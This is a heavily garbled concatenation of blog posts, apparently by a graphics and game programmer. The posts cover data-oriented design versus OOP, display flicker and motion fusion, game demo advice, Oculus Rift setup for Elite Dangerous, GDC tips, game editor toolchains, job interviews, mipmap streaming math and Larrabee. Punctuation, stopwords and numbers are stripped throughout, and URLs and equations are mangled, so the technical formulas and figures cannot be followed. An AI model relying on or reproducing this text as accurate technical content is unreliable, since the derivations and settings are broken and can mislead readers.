gnashing teeth corner hipster coming university course head full java python looking blankly talk bitfield manipulation justifiable use goto say compile think mean tokenize regard exceptionhandling part standard control flow rather admission failure code design unfortunately dod message get conflated two big language flamewars going let clearly enumerate object oriented programming answer everything c terrible implementation oop language using lot indirection trash cache destroy performance never able find big new dod thing ranting really difficult argue hard many example better language many example dumb bug caused c implementation decision amusingly one thing hipster completely agree also difficult anything practical reality nobody going switch another language time soon current leading contender java python smack problem pretty hard course switch lisp let know happens join dancing around bonfire edition k r need side debug muppet lack parenthesis look zillionth time declare function returning pointer array const function pointer put bitching c bucket complaining frailty human spine mac one mouse button nothing shut deal really interesting discussion certainly new dod folk nt start game coder dod context may first place seen people quite brazenly oopphobic even interesting discussion answer clearly oop us oop answer everything somewhere middle position line matter happen think oop overused particular think oop used thing want object abstraction unfortunately major way c know abstraction object thus time want abstraction eg cache previous result path end getting pushed c oop make object represents cache make inherit aaaarg gghhh bunch oopy shitty unreadable code shitty oopy nt oop inherently bad design paradigm appropriate thing see people thinking dod oop opposite end spectrum c fault though fair bunch oopy language screw well c object real game object like tank person bunch member value position orientation health ammo put value contiguous memory dod say rendering care first two item polluting cache two rendering two separate array posorient healthammo one object reference separate item array actually totally fine oop say want able type obj po obj ammo want able call shootat nt say anything data structure laid theory dod oop completely compatible oop design syntax philosophy dod care data layout traversal order example language two concept kept separate database access data ie viewsqueries decoupled data stored unfortunately c make really difficult separate data layout syntax suspect gratuitous overloading andor templating force everything use accessor function maintainability code plummet rapidly yes c dod oop tend tug different direction k r kicking nut really used hellothere vr optic ipd mean many thing nt larrabee fail srgb learning curve nan cause craziest bug memory stack resizable array premultiplied alpha part texture coordinate origin blog entry progress fp precision problem machine compiler optimization changing constant recording holding rngs player input record need append savegame playback way compressing vertex data using principle displacement mapping without needing complex hardware support idea encode vertex three index vertex plus two barycentric coordinate plus displacement along interpolated normal give vertex byte size far smaller representation reducing memory footprint bandwidth requirement stream easily decoded shader hardware ubiquitous detail see dean calver article using vertex shaders geometry compression available free http paper displacement mappinghttp wwweelpigotdnsorgpaperspapershtml originally wrote response blog post eric haineshttp turned bit essay along way thought repost also add clarification two separate concept people frequently conflate flicker fusion motion fusion sortof similar absolutely occur different frequency time writing wikipedia article flicker fusionhttp enwikipediaorgwikiflickerfusionthreshold mess constantly switching two without warning also misleading plenty people see flicker well one variance large human post try best clear use hz talking flicker fps talking motion although something study huge amount vr hmds going say much post stuff post vr go work blog site centered around tv monitor cinema flicker fusion flicker fusion simple lowest speed flickering light stop flickering varies people also distinction conscious flicker perceptible flicker using example consciously see flicker however look flicker hour get headache certainly perceptible flicker need hurt gap uncommon though largely driven anecdotal evidence crt setting people front flickering display hour end something much case experience gained youth early highspeed crt expensive finally found nice secondhand iiyama monitor would consistently give pixel text also run believe display running fast enough make everyone happy though possible rare exception know one email love use guineapig people significantly sensitive flicker peripheral vision middle also difference may people tolerate crt tv monitor fewer tolerate flourescent lighting flicker lower duty cycle raise threshold flicker fusion nt good data memory going dutycycle need another reach flicker fusion curve funky nonlinear fairly obviously duty cycle zero flicker frequency nt try extrapolate much know duty cycle important motion fusion motion fusion rate successive image appear start moving smoothly note unlike flicker moving smoothly continuum higher framerates absolutely improve sense motion people smooth motion start around film still consciously increase quality possibly beyond combining two interact well cinema typically frame per second usually enough motion typically duty cycle would flicker like crazy simply displayed one frame every cinema flash frame two three four time reduce flicker nt great data projectionist let know wrong believe past cinema used modern cinema mostly use low surround experience cause much flicker people peripheral vision choice crt tv driven flicker fusion limit framestorage ability early tv forced actually display many frame lower duty cycle cinema usually around exponential dropoff rather square wave even number handywavy may explain needed higher frequency cinema however cheated resolution interlaced get frame per second however true cinema sense even interlacing get motion second though depend camera recording equipment wellversed tv tech though nt know often get halfframe motion often get squashed fullframe motion know video game look visibly better people fastmoving content whether care enough different question one continues rage easily see difference one nt really look better monitor however vr hmd different matter variety reason many modern lcd tv advertise mode even regular input fairly obvious look smoother like look smoother look smoother people subtle effect certainly see difference mainly smooth pan course tv get extra frame data somewhere extracting motion vector successive frame inventing new frame tweening cause odd artifact sometimes although algorithm much better day still prefer watch data tweening also add latency fine film bad interactive content ok deal well first ai nt marketing bullshit frame data interleaved frame black engineer might put duty cycle illumination nt look good billboard lcd screen turning usually led backlight black frame also give lcd pixel chance switch state illuminated turn display half time normally lcd display fullpersistence pixel lit time backlight take switch colour always lit always showing something mean thing like smooth pan eye following pan across screen pixel course moving discrete jump continuously smear image across retina result blur get really badly vr detail see michael abrash great post subjecthttp blogsvalvesoftwarecomabrashwhyvirtualisntrealtoyourbrainjudder also happens tv eye following moving object solution lowpersistence otherwise known turning pixel frame turn pixel wo nt smear duty cycle good sharp image nt done lcd screen problem duty cycle cause flicker least widescreen tv monstrosity day lcd tv get going lowpersistence really look better lot content edge get sharper even though sometimes lose brightness prompt question show data low persistence show frame twice like cinema need motioninterpolation tech well coz otherwise pixel nt smear doubleimage think smearing effect middle smear missing two end time something move get double image visible effect even people perfectly happy rendering ca nt see flicker still see doubleedge effect lowpersistence cinema work around adding mass blur gigantic gob time anything move existing tv content nt authored much motionblur would doubleimage tweening generally forced go lowpersistence interesting historical question crt inherently lowpersistence duty cycle depending phosphor look terrible theory nt know better competition cinema sucked even going release demo try minimally playtest first people already played game b spend anything like bizarre reason fail immediately hand exchange full copy game might want think tweaking demo checklist exactly rocketscience truly astounding many manage violate one point every single one even astounding random downloads thid fourthtier publisher fileplanet whereever manage consistently score several bazillion point firsttier publisher parading stupidity heavilycontrolled scruitinised xbox live maybe lowlier publisher work money know paraphrase miyamoto late demo eventually good rushed demo bad forever put another way demo nt fanbois read gaming press would buy turdinabox comapny x demo nonhardcore looking something new release demo early suck turn away everyone including fanbois ship game go master make sure horrible glaring bug fixed balanced might pull longerterm interest keep hurled bargainbin two week release possible include tutorial know think precious snowflake intuitive pickupandplay remember demo fanboy bought first eight episode game series find people nt preorders may know play game may never played game like may never played game probably surplus bill one could really ca nt bothered tutorial least help screen tell people button controller maybe even strange bar screen icon minimap especially flash flashing say important explaing important stuff show disdain player nt make screen loading screen guess vanish player reading nothing show new player middle finger quite directly screen full important text nt let read properly nt even pressed button already hate make demo nice easy demo present challenge player demonstrate full set feature example certain fighting game renowed boob physic might want slow everything bit make computer opponent quite well ninja player actually able experiment cool throw spent long game code animation instead midair juggled health bar instant anything madly bash uppercut button unique selling point game teh ace others teh suk spent manyears product publisher beating head deadline may talking crazy thinking may wish explain player nt player looking product thinking deep philosophical question would spend want thinking sort question want thinking wow glad spent brilliant game ca nt manage least go shame spent game usp sounded cool nt much fun level bank manger equally happy either first contact large chunk potential audience deciding whether give feed wifehusbandkidscatllamahabit marketing done job punter finally devoting full undivided attention game playing demo fifteen minute fame person nt like demo nt matter hard crunched get game door side hobby supersecretproject tinkering writing game writing game professionally really nt feel like game home refreshing change designing instruction set however question game nt want try think something new dammit jim programmer game designer blatantly stole concept two favourite game dwarf fortresshttp transport tycoonhttp enwikipediaorgwikitransporttycoon like similar reason set system little autonomous agent run around system sort indirect influence really appealing programmer well gameplayer starting highlevel concept dwarf fortress train could go pretty much place really point thing really done writing map structure managing inventory pathfinding simple ui loadsave whereas already done ton graphic sound stuff project literally nt care graphic literally bunch teapot running around gouraudshaded fixedfunctionvertexshader environment using function abusing poor graphic card number draw call refuse care much spirit dwarf fortress us full opengl pipeline emulate ascii terminal though least proper camera sake playability much love df interface huge barrier gameplay pretension ever ship game may even ever fun play since goal far fun program certainly playable programmer lot interesting little thing kept intrigued never really come life graphic coder thought write edit good info time everything work post obsolete nt like remove stuff web remains posterity waiting long time elite bbc model b school speccy home machine game made sit realise rendering thing awesome figure also rapidly discovered thing difficult inspired keep pushing coding knowledge basic forth assembly learning sort trick year later atari st felt actually knew finally competent graphic coder moment came viper rotating screen fast st version elite much later went back learned detail version realized many trick played amigast version comparatively straightforward comparison later university met david braben time despite rampant fanboyism helped get start industry always graphic programmer heart various job almost every project ever worked first thing get running rotating viper type coordinate face memory nt actually difficult neat party trick find oculus working vr lo stream crossed two awesome thing coming together nicely version elite still work progress already mighty impressive thought write guide getting working virgin home machine rather work one using public resource hopefully many surprise replicating instruction machine nt tried elite version window yet recommend reasonably fast desktop machine vr general laptop give good vr experience machine geforce machine radeon neither bleeding edge work well install latest public rift runtime sdk time writing sdk display driver camera driver later version also work common mistake forget plug sync cable camera junction box hmd cable junction box end little stiff first make sure pushed way also remember remove sticky plastic shipping cover camera lens stroke genius part transparent visible light make easy miss completely opaque ir remove silvercoloured cover meant reflects visible light transparent ir make sure rift turned button top right power button press light yellow blue careful putting rift easy press button turn rift put head least week ready light rift blue light camera blue serial number displayed oculus config util check cable open oculus configuration utility set user profile enter detail calibrate head shape using advanced button important follow instruction side adjustment dial correctly set way actually calibration set back comfortable set slider config util match dial setting chose note picture config util dial right side hmd check everything working clicking show demo scene oculus config util track head rotation translation smoothly desk object seem realistic size ok rift set default direct mode however time writing elite still using older extended mode like lot apps little fiddly set elite chap say working directmode support right experimental nt tried yet oculus config util tool menu select rift display mode select extend desktop hmd hit accept make rift show monitor window make sure rift turned blue light next bit nt gone sleep rightclick desktop select screen resolution see least two monitor connected one monitor called rift monitor size orientation say landscape even though clearly taller wide normal change orientation portrait portrait flipped confusingly change monitor apps use mode elite need make multiple display setting say extend display call extended mode extending desktop onto rift nt try actually use desktop though nt worry rift show monitor monitor either fine window desktop still primary monitor either way click make main display rift monitor otherwise icon start bar move rift horrible way seriously nt try rerun oculus config util demo scene desk card work correctly extended mode way direct rift set extended mode handy thing know lot apps still use flip back direct mode using oculus config util app let get elite working install start elite main menu select option graphic scroll quality section put preset low fiddle various setting later elite look gorgeous even low give best possible vr experience remember vr framerate king gorgeous shaders world good making framerate machine framerate still drop inside really pretty spaceports see doubleimage judder combat matter mostly smooth silk hit apply coz tricky bit go option graphic find heading called select one oculus rift mode highly recommend using headphone rather speaker full awesomeness hit apply yet make sure hmd sitting horizontal eg put lap wo nt able see anything go heading called monitor top select one usually called secondary two option sure pick sorry right fullscreen refresh rate vertical sync frame rate limit line redded resolution mean elite correctly detected rift special display ok read next line direction hitting apply screen go black quickly put rift waggle mouse get cursor may need waggle long way left right get appear asking sure want keep change click yes nt ten second surprisingly short time expecting drop back normal monitor ok wearing rift hopefully see menu screen top left view yes difficult read welcome experimental software test pilot play game time want switch back desktop remember select monitor primary together hitting accept otherwise thing get difficult cock thing nt panic wait second revert previous setting try time press reset rift orientation includes menu screen useful switched rift pointing strange direction thing help quality life rift elite like playing mouse backorder would remap key set speed c remember x default cycle next fire group cap lock ui back left shift remember keyboard knobble blob f j key whenever need key row like g next target j jump pretty easy find function nontimecritical landing gear cargo scoop etc accessed going righthand panel default colour hud quite reddish give optimal resolution colour green white elite limited control colour palette find file graphicsconfigurationxml folder c open text editor tweak bit really handy interactive page choosing set elite dangerous hud colour theme editorhttp arkkucomelitehudeditor instruction however many possible colour choice leave problem ca nt tell instation menu item redded one ca nt tell red blue yellow dot friendorfoe tracker colour palette fairly modest change turn text bit yellow ie add green help readability without breaking thing much guicolour default localisationname standard localisationname matrixred matrixred matrixgreen matrixgreen matrixblue matrixblue default elite already amazing experience rift little klunky time sure tweaking become even amazing happy flying remember look see regard cmdr foursyth usual antibot obfuscation address tom dot forsyth eelpi dot gotdns dot org bonus karma point ben garney garage game spotted silly math error mine knowing mipmap level needed corrected starting blog wrote moan double precision storing absolute time position done fixed point instead rereading bunch shorthand bit skipped unstructured hard read like rant also talked early gpus nobody really care somehow managed talk position completely forgot time typo many typo thought could cleanup matter precision lot fun slightly quieter last year according many company sending key people rather massed horde also seemed like lot fewer random mousemat manufacturer dvd duplicator like michael abrash gave talk almost filled gigantic room little room totally full even standing room available made sure left minute end talk question ended half hour question kick u room next session call success general site larrabee need http wwwintelcomsoftwarelarrabee slide available scroll near bottom http intelcomsoftwaregdc michael abrash article dr dobbs journal live http c larrabee prototype primitive available http softwareintelcomenusarticlesprototypeprimitivesguide allow write larrabee intrinsics code compile run pretty much anything adding include file intent make easy possible prototype code existing project without changing build went see runehttp runevisioncomblog talk locomotion see walk better really superb great tech great interactive slide really good presenter read stuff go see bunch stuff nt seen trick like stop ankle flexing bizarrely people step high place asked recently best way approach http wwwgdconfcomgdc newbie gdc big busy place easy people get bit lost handy hint take hour beforehand sit go entire timetable timeslot mark top three thing like see give score might interesting must see remember least look track nt main discipline sometimes interesting crossover stuff write score actually get gdc transfer onto ataglance schedule thingie get welcome pack refer quickly day prioritise session nt know much sound interesting thing right middle primary field example graphic programmer already worked lot probably great deal point going talk called unleashed new feature effect going teach much new stuff done much generalpurpose multiprocessor work talk called dragged kicking screaming source multicore sound fascinating probably give new insight start multiprocessor work prepared miss lot lecture gdc pretty chaotic allow chaotic nt try control much talking someone interesting rushing something keep talking always go lecture second half worst pick lecture note later might never meet interesting person nt spend long familiar stuff gdc meant new stuff nt hang bar gossip friend day hang bar gossip new people instead nt spend long expo quick walk around fairly early check place see might interesting nt hang around play stuff two hall year gone even bigger probably noisier previous gdcs find something interesting note later find spare half hour lunch go back better look similarly expo crowded go something else probably lunchtime something come back hour quieter booth people still actually able see something talk without shouting also nt expo first day last day everyone else remember two expo hall year five minute lecture find lecturer dull present badly reading slide leave obvious going get much reading slide later seeing talk person quicker time valuable go nextbestrated lecture list lecture better person one watching feel embarrassed walk take phone vibrate got call text message walk glaring lecture notepad pen question scribble end lecture presenter ask question always deafening silence minute everyone remembers question stick hand go microphone ask question fill feedback form gdc committee collate take pretty seriously considering invite back speak next year author also get feedback comment good info terrible speaker say use whole scale forget bad good excellent point messing around score voice lost statistical noise everyone always asks party one go party animal nt enjoy far socialising terrible talking almost impossible unless wealthy persistent hungry thirsty much better hang hotel bar lobby friend still see plenty game geek able talk eat far relaxing mean gossip til early hour still reasonably awake first lecture next day nt worry think missing cool stuff everybody always miss cool stuff year sf rather san jose nobody know anything even old pro confused go indie game festival definitely visit igf pavillion check game chat developer standard awesomely high every year play meatspace mmo game year gang gdc nt usually take significant amount time good excuse silly talk people programmer challenge back always amusing ubergeek developer choice award worthwhile bogus award go cheer people nt suck work progress main page yet topic guaranteed cause argument amongst shipping veteran editing level script shaders etc three obvious option although different aspect may use different one eg shader editing may done one place level editing done another plugin dcc tool choice max maya xsi etc standalone editor part game second two obviously close difference whether saveconvertreload cycle every time want test something actual game console developer obvious distinction mean nt make pc version game simply test edit simplify argument going lump second two together say two choice embedded dcc tool fullycustom editor share much possible game engine advantage making game editor obvious get see thing really almost instantly using real rendering engine using real assetmanagement system using real physic engine cunning design model wo nt work inside engine know immediately three month later already authored bunch content artist designer experiment however like see result immediately know look good play well biggest advantage make right level designer set object script hit button instantly playing game keeping designtesttweak iteration cycle fast tight possible key excellent gameplay true lighting whether realtime lightmapdriven sound environment rely large chunk environment around see whether work almost impossible small unconnected piece without fast preview disadvantage complex make engine run two different mode editing playing editing mode running powerful pc often unoptimised asset optimising take time lead longer turnaround cycle nt want argument putting editing tool inside dcc tool obvious artist already know use tool bunch editing rendering code already written reinvent wheel ordinarily agree wheel reinvention plague burn far much programmer time industry hang bit really true fundamentally big problem deal previewing asset actual game environment mean shaders texture lighting model shadow lightmaps artist ca nt see fast preview building model going lot guesswork level design placeholder artwork hackedin control scheme prescripted actor movement nt matter need give designer tool work start getting broadstrokes design stuff running everyone get feel game going sound animation design seems odd put two together really time component need smooth blending make fundamentally different thing rendering lighting still need able easily preview real game also animation frequently sound trigger footstep equipment sound etc bonus annoyance typically animator sound guy nt person nt know use tool want edit file independently keep iteration time mean le second tweaking modeltexturelightobject placementtriggerscript trying game know iteration evolution heart good game need keep dead time iteration loop lowest possible preference make engine able reload asset press button shut start waste time especially area tend optimise last game need artist able edit something dcc tool hit button result visible right requires decent amount infrastructure though lot shared thing like streaming system really good thing stuff like dealing alttab pc even reload existing asset big timesaver import new model new texture name etc even better make sure engine read asset directly exported data minimal fullyautomated processing nt render quickly obviously need another optimised format actually ship data also need something quick turnaround time nt matter model artist currently editing loading texture raw tgas big video card day happy texture batch script tool compress preferred format either done overnight another preview button artist see compressed version actually look like ditto thing like vertex cache reordering optimal animationbone partitioning none stuff matter artist actually editing model batch process overnight one really nice thing focussed fair bit year forward backward compatibility file format store sort data file raw compressed loadable anything time one subtlety processor never modify original data stuff come dcc tool minimally processed export process convert standard format leave much data later processing step strip data different file target inplace modification way optimised format change nt need fire dcc tool bunch reexporting run batch file raw exported data new improved format level lighting editor game using maxmayaxsilightwave level editor never work well tried way discussed others think getting dcc tool camera movement model easily replicated bad renderer already good renderer raycast mousehit checking every game already bad button ui guarantee annoy snot actually go use trying use dcc tool interface serious previewing horrible think trying implement sort shadowbuffer rendering implementing movement logic character inside inside dcc tool pretty absurd reinventing wheel little dcc tool actually need want something scope level editor animation sound editor absolutely game doubt dcc tool nt help need able see blending transition different animation sound environment really dcc tool nt bring anything table way seen animation editor done really well past game playable ideally control character last thirty second continuously recorded time animatorsound guy pause scrub time window tweaking blend sound event happen rant smartest coder tool coder need write level editor makefiledriven processing chain dcc tool digital content creation micro scale individual character individual animation set entire level really bad previewing pretty handy gamemiddlewarehttp wwwgamemiddlewareorgmiddleware website big list game middleware tired people reinventing perfectly good wheel unless game going focus best system x world go look someone already got perfectly good x buy spend time solving interesting problem also tinkered title much point title date date written r look sensible way big bag goodness radgametools exporter sort data max maya xsi asset pipeline manipulation conversion tool normalmap generator really cool file system cope endianness bit pointer versioning ship different platform world superlative runtime animation system granny written casey muratorihttp wwwmollyrocketcom originally handed two exciting year taken dave moorehttp onepartcodecom even though nt worked granny still pimp like crazy anyone within earshot seriously bunch really cool tech bunch rather tedious tech bunch gnarly problem solved brightest mind business wrapped lovely little bundle replicate would make officially insane pay money get something interesting think manyears would saved working muckyfoot ooh make mad dave said ca nt replace existing animation coder paint big red shttp enwikipediaorgwikisuperman chest time go granny becomes entire toolchain taking mesh texture tangent space animation annotation data various dcc tool exporting reliable robust crossplatform format processing data large variety way finally delivering data optimised form game engine underappreciated area game programming viewed sexy job coder tends done hastily often junior programmer result usually source much pain least artist designer use nt let happen start toolchain solid foundation hello welcome blog always fresh always technobabble read chronological blog usually listed use link left emailme although technically wiki editing personal copy public one finished round interviewing various company part pretty positive experience however last time pleasant wrote bunch moan dev friend good natter laugh may nine year ago still relevant interview people company would worth look list interview go two way many case interviewing interviewing quality pertinence question ask reflects strongly company sort meta message apply following simply asking question end interview cover arse big difference interviewing newbie college experienced veteran try adapt style read cvresume dammit could start long lasting relationship least courtesy reading cv asking algos blindingly obvious graphic coder life say really nt paid attention work list various papersarticles written least skimread give stuff talk stop asking question answer read paper embarrassing concerned ask arbitrary logic question especially one trick know crossing river various object animal reversing linked list inplace thing like three option first heard question know answer admit prove except done lot interview recently second heard question pretend nt know fake working look like genius devious arsehole cool third nt know question flounder away trying spot trick time pressure random long take logic puzzle good testing good logic puzzle like iq test cryptic crossword loosely related good practical problem fact shipped game designed large system tell test nt ask math degree question see compsci degree answer nt know nt math degree know find answer bookon web especially answer way computer would b dispute within company anyway know question knew nt know right answer nt ask grind detailed math question answer along line b c boil linesphere intersection check show know coder need know performance characteristic memory impact robustness etc making actually write exact equation tedious make trivial sign error pressure ca nt put asserts test harness check practice use library call anyway nt make write code whiteboard piece paper rough algos sketch sure c interactive editor norm longer alive u write code particularly linear fashion even writing article linear fashion fact order write thing extremely revealing think day punched card finally behind u plus handwriting whiteboard illegible question specific answer tedious cv show competent coder shipped title done gdc talk assume indeed competent let skip basic c would use matrix crap get interesting question like would write graphic system see curvature earth relevant stuff like surely far relevant revealing knowing eratosthenes sieve reimplementing hash table especially wary asking specificanswer question field know well may know field better may mean correct answer one expecting correct interview get extremely awkward everyone concerned really must ask question see brain work simply discussing state industry general coding issue nt done already least pick one obviously nt trick answer actually know stuff like one asked exam many year ago fast tip bee wing move hint bee buzz reasonable way show someone brain work careful preconceived notion correct method documented wellknown barometer questionhttp enwikipediaorgwikibarometerquestion still substitute asking relevant topic really annoy people irrelevance job hand least actively insulting demoralizing give standard know cc programming test decency look embarrassed say sorry give everyone also answer look specask guy wrote change unambiguous almost always right answer correct answer nt ask question thinly disguised version psychopath hate management antisocial nih etc lame guess slim chance wo nt realise lame blurt revealing answer doubt ca nt tell whole lot general discussion wo nt get crappy direct question like half intelligent think lie give answer want hear question especially eyerolling personally know staff indeed worked nt ask nt already asked nt trust happily sign whatever ndas like tell thing ca nt tell ok answer afraid ca nt discus proprietary information question thought especially true future plan current project thing want work imagine investing company attempt look bored ninth interview many day easily outtrump feed lunch cheapskate always give time randomly chat people working lunch ideal get grilling interview room going flexible pay etc hesitation making higher pay demand company nt feel comfortable think going buy happiness outside work get pay try flinch say money start negotiation final demand obviously going start high end nobody ever started low especially true going move country extremely difficult qualityoflife comparison converting one currency another hard enough moving one part uk another going start higher think case first read part interview remember experience nine year ago course finished another round interview decided continue vr adventure join rather spiffy oculusvroculusvrcom interview went fine shipping first game use company hardware tends make interview fairly simple however others go smoothly first good news everybody lot better last time bad news people still nt really understand interview go two way nt realize fail really faceplant dramatically gamedevs like gossip much folk nt let happen concrete tip whiteboard coding yeah obvious fail fortunately one company least looked sheepish another suggested looked pained counterproposed pull laptop open notepad seemed acceptable question least super simple trick clearly designed check yes know bitshift also whether look track offbyone error actually turned decent question done actual computer asking question interviewer know answer best question simply opening discussion sort question opposite quells discussion interviewer usually want hone answer also encourages feeling interviewer charge interviewee sit interrogated way interview actually lot interview like none went well style interviewing prevents people getting build rapport one particular interview excruciating question animation kinda know animation wrote book wrote two year company interviewing use fairly clear interviewer nt read resume nt great start determined ask bunch basic question anyway went rather stilted manner one stage asked question answer depends way building tangent space somewhat obscure fact two different thing people call tangent space usually people know one way think way interviewer hugely awkward couple minute explain interviewer much nt understand question asking interview dynamic forced interrogatorsubject dynamic allowed fall situation two peer discussing complex subject would totally fine nobody know everything swapping knowledge fun worst thing interlude plowed right back questionandanswer format could facepalmed back made walk demo slide available http wwweelpigotdnsorgpaperspapershtmlhttp wwweelpigotdnsorgpaperspapershtml showed interpolation walking stance cope uneven terrain foot ik trickier look always meant keep updating demo feature notably missing stop sure many remember gdc one granny xena warrior princess outfit certainly eye catching thanks steve theodorehttp wwwbungienetinsidemeettheteamaspx personstevet memorable artwork anyway got distracted larrabee never add feature always felt bad rune skovbo johansenhttp runevisioncomblog done similar system taken lot us fewer animation cycle cope terrain cool feature include motion ledge avoidance stopstart leaning slope fourlegged animal foot placement stationary rotation comprehensive locomotion system going see get gdc talkhttps optionc converted old article impostor html live searchable also added hindsight article written startopia published implementation note added nt work practice paper article sectionhttp wwweelpigotdnsorgpaperspapershtml people bugging age guess time start blog try ramble much first elder scroll iv oblivionhttp wwwelderscrollscom totally fantastic game playing xbox gorgeous yes yes got gameplay wazoo well hour barely feel like started graphic tech whore reserve right spooge pixel amazingly immersive worked immersion defined best bit worst spent lot time filing rough edge one game screenshots website look like time game walk around texture seam place get close thing really obvious big flat billboard whatever spent quarter hour yesterday walking around looking tree plant fallen log lake little stone bridge way sunlight went leaf totally forgot playing game mud crab almost tore leg probably need get real world hear pretty neato tree stuff well mention world powerful photonmapper fewer mud crab fundamental signalprocessing concept called various different name mostly word nyquist wave hand lot ignore scream people actually know talking say object pixel high screen need use texture rendering give texture mipmapping hardware ignore extra data use anyway right thing disable mipmapping force use larger version get sparkling ugliness obviously complex get detail important point size texture need object directly proportional object size onscreen texturing hardware pick appropriate mipmap level ensure size actually using every graphic programmer nodding head saying well course point another thing subtly different important realise far nt said big texture ie size top mipmap level nt matter whether give graphic card always going use version difference much memory wasting data never get used streaming texture disk creating ondemand eg procedural terrain system incredibly useful know nt need spend cycle memory loading big mipmap level object distance everything going load much quicker take le memory mean use extra space time increase scene complexity obviously approximation coarse size pixel matter use texture coordinate map texture onto object actually find largest mipmap need thought experiment going start absurd bear take triangle calculate many texels artist mapped triangle top mipamp level calculate many pixel triangle occupies screen number texels number pixel rule nt need top mipmap level throw away divide number texels keep number texels new top mipmap level le number screen pixel keen reader spot trilinear filtering mean actually need one mipmap level keep thing simple going ignore add one end triangle use certain texture throw away mipmap level none triangle need concept obviously far expensive practice first step get rid loop say number mipmap level throw away topmipmaptexelarea screenarea quick sanity check texture area texels draw pixel square screen pixel need throw away mipmap level correct multiplying half actually nt want x want x number texels drop mipmap level x x obviously precalculate value topmipmaptexelarea mesh texturemapped constant value triangle calculating screenarea triangle frame expensive want approximate pick area approximation high actual value screenarea higher one current frame throw away fewer mipmap level could done nt actually bad yes waste bit memory texturing hardware still right thing produce right image approximating high nt change image quality given approximation make assume every triangle always parallel screen plane normal pointing directly viewer largest triangle possibly screen pixel practice angle take fewer screen pixel large maximum size well assume mesh deformation skinning nt crazy thing ignore triangle always stay size world unit eg meter distance viewer horizontal screen field view f radian horizontal pixel size p screen length world meter md ptan f pixel length world length screen length want world area screen area square result feed world area triangle get screen area ptan f p tan f quick sanitycheck double distance away quarter screen pixel double screen resolution four time pixel widen fov smaller screen area ptan f get calculated frame trivial cost make another approximation distance done every triangle measured closest point bounding volume object conservative assuming triangle closer ie larger really single mesh calculate p tan f use triangle brevity call factor q triangle screenarea worldarea q looking back mipmap calculation calculate topmipmaptexelarea screenarea triangle take minimum many mipmap level actually throw away minovermesh topmipmaptexelarea screenarea minovermesh topmipmaptexelarea worldarea q minovermesh topmipmaptexelarea worldarea q minovermesh topmipmaptexelarea worldarea q course value topmipmaptexelareaworldarea constant triangle mesh assuming skinning deformation nt extreme thing minimum value constant entire mesh precalculate result nt done pertriangle calculation runtime grind math bit find boil perframe constant b permesh constant distance mesh camera remember xy x quick sanity check double distance mesh viewer increase drop one mipmap level correct pretty nifty streaming texture system mean mesh us texture runtime two add frame get result saying many mipmap level nt need remember throwing away one mipmap level save texture memory huge benefit nt want memory nt theory implemented streaming system used blade ii xbox engine muckyfoot saved lot memory per texture meant could keep lot texture memory well allowing texture per frame also meant could keep lot texture cached memory actually needed frame allowed u stream far aggressively originally intended initial design engine stream assumed dvd seek time would cripple streaming system lot memory available texture could prefetch ahead reorder streaming request reduce seek time system actually worked pretty well flip question next neat trick instead asking many mipmap level throw away ask many need obviously number subtracted texturesize go back original equation topmipmaptexelarea screenarea look actually calculate topmipmaptexelarea triangle find area idealised uv texture coordinate space multiply number texels texture answer new question many mipmaps need texturesize areainuvspace screenarea texturesize areainuvspace screenarea texturesize areainuvspace screenarea texturesize areainuvspace screenarea screenarea areainuvspace hey happened texture size canceled yep right go back something mentioned right top texture selection hardware care size top mipmap level unless want one nt exist obviously give large enough texture nt matter big texture every graphic coder saying right knew actually quite nonobvious thing mean streaming texture system thing matter many mipmaps need load memory rest left dvd loaded memory answer question independent size original texture depends mesh uv mapping distance camera actual graphic engine streaming rendering nt care large texture mean rendering speed space taken memory time needed read disk identical even artist make every texture entire game say limit size texture artist make total space dvd time taken make texture finally grokked making muckyfoot engine used game blade ii kicked actually true blade ii engine nt realised time pretty cool thing go tell artist practical limit texture size nt really believe first almost heretical thing tell artist spent professional life coder yelling making texture instead nevertheless streaming system load mipmap level need absolutely true practical problem course still practical limit one thing break standard artist trick using fewer texels le important thing sol shoe underside car happened would use new texture space interesting thing like face hand texture size would grow sol foot would stay size texels care preprocessor would calculate mipmap level would need texture sol foot would dominate result would try still map correctly nt know le important everything else way solve ideally artist would able tag face ignored calculation tricky retrofit asset pipeline way found worked pretty well take minimum linear texel density triangle cope stretch skewed texture mapping mesh take maximum minimum find triangle thing like face hand density assume artist intended nt give many texels per meter triangle assume intentional deliberately wanted lower resolution area one counterintuitive thing deadspace border area texture atlas need grow well artist making texture texels space part uprez space need grow texels well border space deal bleeding create mipmaps need make sure eg mipmap case work progress main page yet paint mipmap level valid invalid sample twice lod clamp blend based alpha codename intel processor architecture work disclosure everything yet coming soon top link moment larrabee manycore architecture visual computing presented siggraph typepapers three short larrabee presentation siggraph part beyond programmable shading coursehttp pretty comprehensive anandtech articlehttp anandtechcomcpuchipsetsintelshowdocaspx wikipedia pagehttp enwikipediaorgwikilarrabee gpu yay michael abrash finally going talk instruction set helped develop rasterization larrabee first look larrabee new instruction lrbni actionhttps optionc simd programming larrabee second look larrabee new instruction lrbni actionhttps optionc pretty much pair going mine without seeing mike first wo nt mean much example note nt graphic talk anybody want program core assembly c using part graphic pipeline example spent time graphic knowledge required bring assembly head going way metal programmer say got invent isahttp enwikipediaorgwikiinstructionset really looking forward finally able talk public three year secrecy creating isa compromise programmer flexibility difficult hardware build always astonished much managed pack without much screaming hardware folk interesting seeing people react got lot funky feature found isa know trying keep quiet need get one thing clear larrabee going render directx opengl game rasterisation raytracing sure message got muddled think quest keep head get possibly bit quiet comment exciting new rendering tech got misinterpreted one plan larrabee tech enables many fascinating possibility excited current confusion got lot developer worried u breaking game forcing change way thing case apologise panic one way render huge range directx opengl game way designed run conventional rasterisation pipeline goal larrabee team day one continues primary focus hardware software team take triangle rasterise z test pixel shading write framebuffer plenty room within pipeline innovation last u many year come done nicely quarter century plenty life old thing yet doubt larrabee going world awesome raytracer going world awesome chip lot heavy computing task joy total programmability combined serious numbercrunching power cool stuff want play wacky tech assuming everybody world forcing anyone certainly ca nt behind back expect thing work would absurd raytracing larrabee fascinating research project exciting new way thinking rendering scene like splatting voxels number neat idea absolutely focus larrabee primary rendering capability never even moment totally focussed making existing future dx ogl pipeline go fast using far conventional method talk rendering pipeline changing beyond people currently know talking using something lot le radical raytracing still exciting game developer stuff asking age ihvs completely failed deliver exciting change existing graphic pipeline coming developer choose enable extra quality consistency larrabee offer incremental change remain completely game developer control nt want use look like fast video card would could change rendering behaviour existing apis probably get trouble post driving nut seeing people spin wheel result misunderstanding much cool stuff way excited think going love well since picked story guess comment technically moved intel yet plan motion one scary foreigner inevitably paperwork sort first wheel bureaucracy grind slowly supersecretproject course larrabeehttp 